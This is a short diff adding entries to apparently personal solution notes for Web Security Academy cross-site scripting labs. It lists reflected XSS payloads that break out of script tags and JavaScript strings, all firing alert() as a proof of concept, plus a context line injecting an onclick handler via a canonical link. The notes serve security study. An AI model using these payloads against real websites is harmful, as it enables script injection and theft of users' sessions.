@@ -105,6 +105,20 @@ t/?test=here%09'accesskey='X'%09onclick='alert(1)
 <link rel="canonical" href="https://0a8c00840479533f80880daf004200f0.web-security-academy.net/?test=here	" accesskey="X" onclick="alert(1)">
 ```
 
+16. Reflected XSS into a JavaScript string with single quote and backslash escaped:
+
+`</script><img src=x onerror=alert()>`
+
+17. Reflected XSS into a JavaScript string with angle brackets HTML encoded
+
+```
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+18. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+`\';alert(document.domain)//`
 
 
 
